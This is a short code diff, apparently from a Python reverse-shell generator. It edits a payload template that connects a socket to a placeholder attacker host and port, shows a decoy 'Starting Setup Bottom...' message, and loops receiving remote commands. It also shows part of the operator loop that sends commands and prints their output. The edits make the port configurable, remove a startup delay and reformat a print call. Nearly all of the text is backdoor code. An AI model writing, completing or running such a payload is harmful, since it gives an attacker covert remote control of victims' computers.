@@ -99,7 +99,7 @@ import os
 os.system('cls' if os.name == 'nt' else 'clear')
 
 ip = '{rhost}'
-port = 4444
+port = {rport}
 
 s = socket.socket(socket.AF_INET, 
 	socket.SOCK_STREAM)
@@ -112,8 +112,6 @@ s.connect((ip,
 	port))
 
 print('[+] Starting Setup Bottom...')
-time.sleep(20)
-print('[+] Waiting...')
 
 while True:
 	cmd = s.recv(1024)
@@ -205,5 +203,5 @@ while True:
 		      elif command != '\n':
 		          conn.send(command.encode())
 		          output = conn.recv(1024)
-		          print("\n", output, "\n")
+		          print("\n",output,"\n")
 
